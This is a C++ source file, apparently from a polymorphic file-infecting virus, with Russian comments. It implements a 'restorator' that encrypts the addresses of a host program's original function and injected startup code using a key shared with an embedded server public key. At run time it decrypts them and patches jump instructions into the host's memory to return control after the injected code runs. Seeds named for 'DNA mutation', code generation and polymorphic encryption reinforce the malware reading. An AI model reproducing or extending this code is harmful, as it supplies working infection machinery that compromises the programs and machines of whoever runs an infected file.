#include "restorator.hpp"
#include "utils.hpp"

CallRestoratorX25519::CallRestoratorX25519()
{
#ifdef _DEBUG
	WriteLog(L"[CallRestoratorX25519] constructor");
#endif
	RtlSecureZeroMemory(&this->restore_keys, sizeof(this->restore_keys));
	RtlSecureZeroMemory(&this->ctx, sizeof(this->ctx));
	ECRYPT_init();

	for (UINT iCounter = 0; iCounter < sizeof(this->chIV); iCounter++)
	{
		chIV[iCounter] = '1' + iCounter;
	}

	this->hHostModule = GetModuleHandleW(NULL);
}

CallRestoratorX25519::~CallRestoratorX25519()
{
#ifdef _DEBUG
	WriteLog(L"[CallRestoratorX25519] destructor");
#endif
	RtlSecureZeroMemory(&this->restore_keys, sizeof(this->restore_keys));
	RtlSecureZeroMemory(&this->ctx, sizeof(this->ctx));
}

VOID CallRestoratorX25519::create_restorator_block(LPBYTE lpRestoratorBlock, SIZE_T dwRestoratorBlockSize, LPBYTE lpParameter, SIZE_T dwParameterSize)
{
#ifdef _DEBUG
	WriteLog(L"[CallRestoratorX25519::create_restorator_block] creating restorator block...");
#endif

	if ((dwRestoratorBlockSize != sizeof(CallRestoratorBlock)) || (dwParameterSize != sizeof(CallRestoratorRVA)))
	{
#ifdef _DEBUG
		WriteLog(L"[CallRestoratorX25519::create_restorator_block] error assert failed invalid parameter size doesnt match");
#endif
		return;
	}

	CallRestoratorRVA *crrParameter = (CallRestoratorRVA*)lpParameter;
	CallRestoratorBlock *crbRestoratorBlock = (CallRestoratorBlock*)lpRestoratorBlock;

	if ((crrParameter == nullptr) || (crbRestoratorBlock == nullptr))
	{
#ifdef _DEBUG
		WriteLog(L"[CallRestoratorX25519::create_restorator_block] error invalid parameter, nullptr passed");
#endif
		return;
	}

	this->create_reskeys();
	_RtlCopyMemory(crbRestoratorBlock->Curve25519_private_key, this->restore_keys.restorator_privkey, sign_ed25519_PRIVATEKEYBYTES);
	
	ECRYPT_keysetup(&ctx, this->restore_keys.restorator_sharedsecret, ECRYPT_MAXKEYSIZE, ECRYPT_MAXIVSIZE);
	ECRYPT_ivsetup(&ctx, this->chIV);
	// зашифруем RVA для восстановления
	ECRYPT_encrypt_bytes(&this->ctx, (const u8*)crrParameter, (u8*)&crbRestoratorBlock->RVAs, sizeof(CallRestoratorBlock::RVAs));

#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[CallRestoratorX25519::create_restorator_block] Original func RVA = 0x%X, Startup code RVA = 0x%X, End of startup code RVA = 0x%x", crrParameter->dwRVAOriginalFunction, crrParameter->dwRVAStartupBegin, crrParameter->dwRVAstartupEnd);
	WriteLog(debugOut);
#endif

	return;
}

VOID CallRestoratorX25519::restore(LPBYTE lpRestoratorBlock, SIZE_T dwRestoratorBlockSize)
{
#ifdef _DEBUG
	WriteLog(L"[CallRestoratorX25519::restore] making host restoration...");
#endif

	if ((lpRestoratorBlock == nullptr) || (dwRestoratorBlockSize != sizeof(CallRestoratorBlock)) || (this->hHostModule == NULL))
	{
#ifdef _DEBUG
	WriteLog(L"[CallRestoratorX25519::restore] error invalid block size, nullptr param or cant get host module virtual address");
#endif
		return;
	}

	CallRestoratorRVA RVAs;
	RtlSecureZeroMemory(&RVAs, sizeof(RVAs));

	CallRestoratorBlock *crbRestoratorBlock = (CallRestoratorBlock*)lpRestoratorBlock;
	ed25519_key_exchange(this->restore_keys.restorator_sharedsecret, config_data::cfg->ed25519_server_publickey, crbRestoratorBlock->Curve25519_private_key);


	ECRYPT_keysetup(&ctx, this->restore_keys.restorator_sharedsecret, ECRYPT_MAXKEYSIZE, ECRYPT_MAXIVSIZE);
	ECRYPT_ivsetup(&ctx, this->chIV);
	ECRYPT_decrypt_bytes(&this->ctx, (const u8*)&crbRestoratorBlock->RVAs, (u8*)&RVAs, sizeof(CallRestoratorBlock::RVAs));

#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[CallRestoratorX25519::restore] Original func RVA = 0x%X, Startup code RVA = 0x%X, End of startup code RVA = 0x%X, host module virtual address = 0x%X", RVAs.dwRVAOriginalFunction, RVAs.dwRVAStartupBegin, RVAs.dwRVAstartupEnd, this->hHostModule);
	WriteLog(debugOut);
#endif

	// восстановим

	if (this->hHostModule != nullptr)
	{
		// посчитаем офсеты от нужных мест
		DWORD32 rel32_start = RVAs.dwRVAOriginalFunction - (RVAs.dwRVAStartupBegin + 5);
		DWORD32 rel32_end = RVAs.dwRVAOriginalFunction - (RVAs.dwRVAstartupEnd + 5);

		// запишем команду перехода в начале стартап кода
		LPBYTE lpOpcodePlaceholder = (LPBYTE)((SIZE_T)this->hHostModule + (SIZE_T)RVAs.dwRVAStartupBegin);
		*lpOpcodePlaceholder = 0xE9;
		PDWORD32 pdwOperandPlaceholder = (PDWORD32)((SIZE_T)lpOpcodePlaceholder + (SIZE_T)1);
		*pdwOperandPlaceholder = rel32_start;

		// запишем команду перехода в конце стартап кода
		lpOpcodePlaceholder = (LPBYTE)((SIZE_T)this->hHostModule + (SIZE_T)RVAs.dwRVAstartupEnd);
		*lpOpcodePlaceholder = 0xE9;
		pdwOperandPlaceholder = (PDWORD32)((SIZE_T)lpOpcodePlaceholder + (SIZE_T)1);
		*pdwOperandPlaceholder = rel32_end;

	}
	return;
}

VOID CallRestoratorX25519::create_reskeys()
{
	// представим 32-байтный seed как массив из восьми DWORD
	DWORD32 *dwSeedParted = (DWORD32*)this->restore_keys.restorator_seed;
	dwSeedParted[0] = GetTickCount();
	dwSeedParted[1] = (DWORD)this->hHostModule;
	if (global_data::pExtendedDataCopy != nullptr)
	{
		dwSeedParted[2] = global_data::pExtendedDataCopy->dwGenCounter;
		dwSeedParted[3] = global_data::pExtendedDataCopy->dwDNAMutatorCounter;
		dwSeedParted[4] = global_data::pExtendedDataCopy->dwDNA[dna_fields_t::CODEGEN_SEED];
		dwSeedParted[5] = global_data::pExtendedDataCopy->dwDNA[dna_fields_t::POLYENC_SEED];
	}

	ed25519_create_keypair(this->restore_keys.restorator_pubkey, this->restore_keys.restorator_privkey, this->restore_keys.restorator_seed);
	ed25519_key_exchange(this->restore_keys.restorator_sharedsecret, config_data::cfg->ed25519_server_publickey, this->restore_keys.restorator_privkey);

	return;
}
